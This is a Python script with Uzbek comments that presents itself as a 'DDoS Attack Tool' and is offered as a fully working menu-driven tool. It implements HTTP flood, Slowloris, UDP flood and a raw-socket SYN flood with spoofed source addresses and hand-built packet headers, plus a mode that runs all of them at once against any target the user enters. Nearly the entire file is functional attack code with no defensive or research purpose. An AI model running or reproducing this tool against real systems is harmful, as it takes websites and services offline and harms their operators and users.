#!/usr/bin/env python3 virtual mode activated use
# -*- coding: utf-8 -*-
# DDoS Attack Tool v0.1 BETA- TO'LIQ ISHLAYDIGAN VERSIYA
# Tested on Python 3.6+ / Kali Linux / Termux

import os
import sys
import time
import random
import socket
import threading
import requests
from datetime import datetime

# Ranglar (terminal qo'llab-quvvatlasa)
try:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
except:
    RED = GREEN = YELLOW = BLUE = PURPLE = CYAN = WHITE = BOLD = ''
    RESET = ''

class DDoSTool:
    def __init__(self):
        self.running = False
        self.target = ""
        self.port = 80
        self.threads = 100
        self.duration = 60
        self.sent = 0
        self.errors = 0
        self.start_time = 0
        
    def clear(self):
        """Ekran tozalash"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def banner(self):
        """Bannerni chiqarish"""
        self.clear()
        print(RED + "╔══════════════════════════════════════════════════════════╗")
        print("║" + GREEN + "              DDoS ATTACK TOOL v0.1 BETA                  " + RED + "║")
        print("║" + RED + "                Created by khamidjanow                    " + RED + "║")
        print("║" + YELLOW + "                     BETA VERSIYA                         " + RED + "║")
        print("╠══════════════════════════════════════════════════════════╣")
        print("║" + CYAN + "  [1] HTTP Flood    - Web saytlar uchun                   " + RED + "║")
        print("║" + CYAN + "  [2] Slowloris     - Serverlarni bo'g'ish                " + RED + "║")
        print("║" + CYAN + "  [3] UDP Flood     - Portlarga UDP paket                 " + RED + "║")
        print("║" + CYAN + "  [4] SYN Flood     - TCP bog'lamalar (ROOT)              " + RED + "║")
        print("║" + CYAN + "  [5] Mixed Attack  - Hammasi birdan                      " + RED + "║")
        print("║" + CYAN + "  [6] Stop Attack   - Hujumni to'xtatish                  " + RED + "║")
        print("║" + CYAN + "  [7] Settings      - Sozlamalar                          " + RED + "║")
        print("║" + CYAN + "  [8] View Stats    - Statistika                          " + RED + "║")
        print("║" + CYAN + "  [9] Exit          - Chiqish                             " + RED + "║")
        print("╚══════════════════════════════════════════════════════════╝" + RESET)
        print()
    
    def get_target(self):
        """Target ma'lumotlarini olish"""
        print(BLUE + "\n[*] Target URL yoki IP kiriting:" + RESET)
        self.target = input(WHITE + "└─╼ " + RESET).strip()
        
        if not self.target:
            print(RED + "[!] Target kiritilmadi!" + RESET)
            return False
            
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'http://' + self.target
            
        print(BLUE + "[*] Port (default 80):" + RESET)
        port_input = input(WHITE + "└─╼ " + RESET).strip()
        self.port = int(port_input) if port_input else 80
        
        print(BLUE + "[*] Threads soni (default 100):" + RESET)
        threads_input = input(WHITE + "└─╼ " + RESET).strip()
        self.threads = int(threads_input) if threads_input else 100
        
        print(BLUE + "[*] Hujum vaqti (sekund, default 60):" + RESET)
        duration_input = input(WHITE + "└─╼ " + RESET).strip()
        self.duration = int(duration_input) if duration_input else 60
        
        print(GREEN + "\n[✓] Ma'lumotlar qabul qilindi!" + RESET)
        time.sleep(1)
        return True
    
    def http_flood(self):
        """HTTP Flood attack"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Android 11; Mobile) AppleWebKit/537.36'
        ]
        
        while self.running:
            try:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                
                response = requests.get(
                    self.target,
                    headers=headers,
                    timeout=3,
                    verify=False
                )
                
                self.sent += 1
                
                if self.sent % 50 == 0:
                    elapsed = time.time() - self.start_time
                    print(GREEN + f"[+] HTTP | Sent: {self.sent} | Speed: {self.sent/elapsed:.1f}/s" + RESET)
                    
            except:
                self.errors += 1
                if self.errors % 10 == 0:
                    print(YELLOW + f"[-] Errors: {self.errors}" + RESET)
    
    def slowloris(self):
        """Slowloris attack"""
        sockets = []
        target_ip = self.target.replace('http://', '').replace('https://', '').split('/')[0]
        
        while self.running and len(sockets) < self.threads:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_ip, self.port))
                
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {target_ip}\r\n".encode())
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                sock.send(b"Accept-language: en-US,en\r\n")
                
                sockets.append(sock)
                self.sent += 1
                
                if len(sockets) % 10 == 0:
                    print(YELLOW + f"[+] Slowloris | Connections: {len(sockets)}" + RESET)
                    
            except:
                self.errors += 1
                time.sleep(0.1)
        
        while self.running and sockets:
            for sock in sockets[:]:
                try:
                    sock.send(f"X-Header: {random.randint(1, 5000)}\r\n".encode())
                    time.sleep(10)
                except:
                    sockets.remove(sock)
                    try:
                        sock.close()
                    except:
                        pass
            
            print(CYAN + f"[+] Slowloris | Active: {len(sockets)} | Total: {self.sent}" + RESET)
            time.sleep(5)
    
    def udp_flood(self):
        """UDP Flood attack"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(1024)
        target_ip = self.target.replace('http://', '').replace('https://', '').split('/')[0]
        
        while self.running:
            try:
                sock.sendto(data, (target_ip, self.port))
                self.sent += 1
                
                if self.sent % 1000 == 0:
                    elapsed = time.time() - self.start_time
                    print(BLUE + f"[+] UDP | Packets: {self.sent} | Speed: {self.sent/elapsed:.1f}/s" + RESET)
                    
            except:
                self.errors += 1
    
    def syn_flood(self):
        """SYN Flood attack (root kerak)"""
        if os.geteuid() != 0:
            print(RED + "\n[!] SYN Flood uchun root huquqi kerak!" + RESET)
            print(YELLOW + "[!] sudo python3 DDOS.py" + RESET)
            self.running = False
            return
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except:
            print(RED + "[!] RAW socket yaratilmadi!" + RESET)
            self.running = False
            return
        
        target_ip = self.target.replace('http://', '').replace('https://', '').split('/')[0]
        
        while self.running:
            try:
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                src_port = random.randint(1024, 65535)
                
                # IP header
                ip_header = self.create_ip_header(src_ip, target_ip)
                
                # TCP header (SYN flag)
                tcp_header = self.create_tcp_header(src_port, self.port)
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (target_ip, 0))
                
                self.sent += 1
                
                if self.sent % 500 == 0:
                    elapsed = time.time() - self.start_time
                    print(PURPLE + f"[+] SYN | Packets: {self.sent} | Speed: {self.sent/elapsed:.1f}/s" + RESET)
                    
            except:
                self.errors += 1
    
    def create_ip_header(self, src_ip, dst_ip):
        """IP header yaratish"""
        from struct import pack
        
        ip_ver = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 40
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)
        
        ip_header = pack('!BBHHHBBH4s4s', 
            (ip_ver << 4) + ip_ihl, 
            ip_tos, 
            ip_tot_len,
            ip_id, 
            ip_frag_off, 
            ip_ttl, 
            ip_proto, 
            ip_check,
            ip_saddr, 
            ip_daddr
        )
        
        return ip_header
    
    def create_tcp_header(self, src_port, dst_port):
        """TCP header yaratish"""
        from struct import pack
        
        tcp_seq = random.randint(1, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_flags = 2  # SYN
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        tcp_offset_res = (tcp_doff << 4) + 0
        
        tcp_header = pack('!HHLLBBHHH',
            src_port, 
            dst_port, 
            tcp_seq, 
            tcp_ack_seq,
            tcp_offset_res, 
            tcp_flags, 
            tcp_window, 
            tcp_check, 
            tcp_urg_ptr
        )
        
        return tcp_header
    
    def mixed_attack(self):
        """Hamma metodlarni birdan ishga tushirish"""
        print(GREEN + "\n[!] Mixed Attack boshlanmoqda..." + RESET)
        
        threads = []
        
        # HTTP Flood
        t1 = threading.Thread(target=self.http_flood)
        t1.daemon = True
        threads.append(t1)
        t1.start()
        
        # Slowloris
        t2 = threading.Thread(target=self.slowloris)
        t2.daemon = True
        threads.append(t2)
        t2.start()
        
        # UDP Flood
        t3 = threading.Thread(target=self.udp_flood)
        t3.daemon = True
        threads.append(t3)
        t3.start()
        
        # SYN Flood (agar root bo'lsa)
        if os.geteuid() == 0:
            t4 = threading.Thread(target=self.syn_flood)
            t4.daemon = True
            threads.append(t4)
            t4.start()
    
    def start_attack(self, method_name, method_func):
        """Hujumni boshlash"""
        self.running = True
        self.sent = 0
        self.errors = 0
        self.start_time = time.time()
        
        print(GREEN + f"\n[!] {method_name} boshlandi!" + RESET)
        print(YELLOW + f"Target: {self.target}")
        print(f"Port: {self.port}")
        print(f"Threads: {self.threads}")
        print(f"Duration: {self.duration} sekund" + RESET)
        print(BLUE + "-" * 50 + RESET)
        
        # Attack thread
        attack_thread = threading.Thread(target=method_func)
        attack_thread.daemon = True
        attack_thread.start()
        
        # Vaqtni hisoblash
        end_time = time.time() + self.duration
        while time.time() < end_time and self.running:
            remaining = int(end_time - time.time())
            elapsed = int(time.time() - self.start_time)
            
            if elapsed % 10 == 0:
                print(CYAN + f"[i] Elapsed: {elapsed}s | Remaining: {remaining}s | Sent: {self.sent}" + RESET)
            
            time.sleep(1)
        
        self.stop_attack()
    
    def stop_attack(self):
        """Hujumni to'xtatish"""
        self.running = False
        elapsed = time.time() - self.start_time
        
        print(BLUE + "\n" + "-" * 50 + RESET)
        print(GREEN + f"[✓] Hujum tugadi!" + RESET)
        print(YELLOW + f"Jami so'rovlar: {self.sent}")
        print(f"Xatoliklar: {self.errors}")
        print(f"Vaqt: {elapsed:.1f} sekund")
        print(f"Tezlik: {self.sent/elapsed:.1f} so'rov/sekund" + RESET)
        
        input(BLUE + "\nDavom etish uchun Enter bosing..." + RESET)
    
    def settings(self):
        """Sozlamalar"""
        self.clear()
        print(CYAN + "\n⚙️  SOZLAMALAR" + RESET)
        print(YELLOW + "-" * 30 + RESET)
        print(f"1. Threads: {GREEN}{self.threads}{RESET}")
        print(f"2. Port: {GREEN}{self.port}{RESET}")
        print(f"3. Duration: {GREEN}{self.duration}{RESET}")
        print(YELLOW + "-" * 30 + RESET)
        
        choice = input(BLUE + "O'zgartirish (1-3): " + RESET)
        
        if choice == '1':
            val = input("Threads: ")
            self.threads = int(val) if val else self.threads
        elif choice == '2':
            val = input("Port: ")
            self.port = int(val) if val else self.port
        elif choice == '3':
            val = input("Duration: ")
            self.duration = int(val) if val else self.duration
    
    def view_stats(self):
        """Statistika"""
        self.clear()
        print(BLUE + "\n📊 STATISTIKA" + RESET)
        print(YELLOW + "-" * 30 + RESET)
        
        if self.start_time > 0:
            elapsed = time.time() - self.start_time
            speed = self.sent / elapsed if elapsed > 0 else 0
            print(f"Jami so'rovlar: {GREEN}{self.sent}{RESET}")
            print(f"Xatoliklar: {RED}{self.errors}{RESET}")
            print(f"Vaqt: {YELLOW}{elapsed:.1f}s{RESET}")
            print(f"Tezlik: {CYAN}{speed:.1f}/s{RESET}")
        else:
            print(YELLOW + "Hali hech qanday hujum boshlanmagan" + RESET)
        
        input(BLUE + "\nEnter bilan qaytish..." + RESET)
    
    def run(self):
        """Asosiy loop"""
        while True:
            self.banner()
            choice = input(WHITE + "┌─[root@ddos]─[~]\n└──╼ $ " + RESET)
            
            if choice == '1':
                if self.get_target():
                    self.start_attack("HTTP Flood", self.http_flood)
            
            elif choice == '2':
                if self.get_target():
                    self.start_attack("Slowloris", self.slowloris)
            
            elif choice == '3':
                if self.get_target():
                    self.start_attack("UDP Flood", self.udp_flood)
            
            elif choice == '4':
                if self.get_target():
                    self.start_attack("SYN Flood", self.syn_flood)
            
            elif choice == '5':
                if self.get_target():
                    self.start_attack("Mixed Attack", self.mixed_attack)
            
            elif choice == '6':
                if self.running:
                    self.stop_attack()
                else:
                    print(YELLOW + "\n[!] Faol hujum yo'q" + RESET)
                    time.sleep(1)
            
            elif choice == '7':
                self.settings()
            
            elif choice == '8':
                self.view_stats()
            
            elif choice == '9':
                print(GREEN + "\nSistemadan chiqilmoqda..." + RESET)
                sys.exit(0)
            
            else:
                print(RED + "\n[!] Noto'g'ri tanlov!" + RESET)
                time.sleep(1)

if __name__ == "__main__":
    try:
        # Requests borligini tekshirish
        try:
            import requests
        except ImportError:
            print(RED + "\n[!] requests kutubxonasi topilmadi!" + RESET)
            print(YELLOW + "[!] O'rnatish: pip install requests" + RESET)
            sys.exit(1)
        
        tool = DDoSTool()
        tool.run()
        
    except KeyboardInterrupt:
        print(YELLOW + "\n\nDastur to'xtatildi" + RESET)
        sys.exit(0)
    except Exception as e:
        print(RED + f"\nXatolik: {e}" + RESET)
        sys.exit(1)
